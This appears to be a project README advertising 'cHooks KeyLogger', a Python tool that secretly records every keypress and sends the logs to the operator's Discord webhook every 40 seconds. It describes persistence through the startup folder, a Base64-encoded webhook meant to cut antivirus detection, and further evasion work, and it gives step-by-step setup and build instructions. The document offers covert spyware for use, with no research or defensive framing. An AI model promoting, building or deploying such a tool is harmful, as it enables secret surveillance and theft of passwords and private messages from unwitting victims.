# cHooks™ KeyLogger | Paradise
<b>cHooks KeyLogger</b> - A no compromises tool made with simplicity in mind.<br>
This program will secretly run in the background while recording every keypress.<br>
It's packed with protections to ensure that it stays as undetected as possible.<br>
All keypresses will be sent to your Discord Webhook every 40 seconds.<br>
<br>
<h2>Features & Protections</h2>
> Creates a ".lockfile", preventing the program from running more than once and causing chaos.<br>
> Uses <a href="https://medium.com/velotio-perspectives/an-introduction-to-asynchronous-programming-in-python-af0189a88bbb">Asynchronous Programming</a> (asyncio) to ensure that no key is missed.<br>
> Attaches itself to the startup folder.<br>
> Requires BASE64 encoded webhook (reduces detections by ~10%).<br><br>
> Currently working on a method to reduce detections more...
<br>
<h1>Setup & Usage</h1>
1. Install Python (make sure to ADD PYTHON TO PATH)<br>
2. Download the files from this repo<br>
3. Get your Discord Webhook and <a href="https://www.base64encode.org/">Encode it with Base64</a><br>
4. Open main.py with any Code Editor (or Notepad)<br>
5. Replace "Your_Encrypted_Webhook_Here" with your encoded B64 string (line 15)<br> 
6. Run <b>builder.bat</b><br>
7. Enjoy :)<br>
